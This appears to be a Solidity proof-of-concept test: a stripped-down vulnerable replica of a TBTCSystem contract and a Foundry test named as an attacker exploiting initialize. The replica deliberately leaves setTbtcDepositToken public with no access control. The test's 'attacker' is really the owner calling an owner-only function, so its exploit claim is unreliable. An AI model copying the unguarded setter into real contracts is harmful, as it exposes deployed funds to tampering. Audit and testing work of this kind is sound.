// Minimal vulnerable replica
contract TBTCSystem {
    address public owner;
    bool private _initialized = false;
    bool private allowNewDeposits = false;
    address public keepVendor;
    address public tbtcDepositToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address /*_priceFeed*/, address /*_relay*/) {
        owner = msg.sender; // deployer becomes owner
    }

    function setTbtcDepositToken(address _tbtcDepositToken) public {
        tbtcDepositToken = _tbtcDepositToken;
    }

    function initialize(
        address _keepVendor,
        address _depositFactory,
        address payable _masterDepositAddress,
        address _tbtcToken,
        address _tbtcDepositToken,
        address _feeRebateToken,
        address _vendingMachine,
        uint256 /*_keepThreshold*/,
        uint256 /*_keepSize*/
    ) external onlyOwner {
        require(!_initialized, "already initialized");
        keepVendor = _keepVendor;
        VendingMachine(_vendingMachine).setExternalAddresses(
            _tbtcToken,
            _tbtcDepositToken,
            _feeRebateToken
        );
        DepositFactory(_depositFactory).setExternalDependencies(
            _masterDepositAddress,
            address(this),
            _tbtcToken,
            _tbtcDepositToken,
            _feeRebateToken,
            _vendingMachine,
            0,
            0
        );
        setTbtcDepositToken(_tbtcDepositToken);
        _initialized = true;
        allowNewDeposits = true;
    }

    function getAllowNewDeposits() external view returns (bool) { return allowNewDeposits; }
}

contract TBTCSystemTest is Test {
    TBTCSystem target;
    VendingMachine vmachine;
    DepositFactory dfactory;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        // Make attacker the deployer/owner of TBTCSystem
        vm.prank(attacker);
        target = new TBTCSystem(address(1), address(2));
        vmachine = new VendingMachine();
        dfactory = new DepositFactory();
    }

    function test_attacker_exploits_initialize() public {
        // Attacker (the owner) calls initialize and sets critical system addresses
        vm.prank(attacker);
        target.initialize(
            address(0xBEEF), // keepVendor
            address(dfactory),
            payable(address(0xDEAD)), // master deposit
            address(0x1111), // tbtcToken
            address(0x2222), // tbtcDepositToken
            address(0x3333), // feeRebateToken
            address(vmachine),
            1,
            3
        );

        // Assert attacker (owner) successfully initialized the system
        assertEq(target.getAllowNewDeposits(), true);
        assertEq(target.keepVendor(), address(0xBEEF));
        assertEq(target.tbtcDepositToken(), address(0x2222));
        // And the external contracts were configured by the initialize call
        assertEq(vmachine.tbtcToken(), address(0x1111));
        assertEq(dfactory.system(), address(target));
    }
}

